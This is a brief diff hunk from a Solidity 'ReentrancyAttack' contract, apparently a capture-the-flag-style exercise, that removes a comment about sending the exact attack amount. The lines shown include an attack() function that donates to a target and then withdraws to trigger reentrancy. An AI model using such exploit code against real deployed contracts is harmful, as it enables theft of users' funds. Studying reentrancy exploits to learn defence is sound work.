@@ -22,7 +22,6 @@ contract ReentrancyAttack {
         emit Withdraw(attackAmount);
     }
 
-    // We have to send ETH within this function, the exact amount of <attackAmount>, otherwise it will not work.
     function attack() public payable {
         target.donate{value: attackAmount}(address(this));
         withdraw();
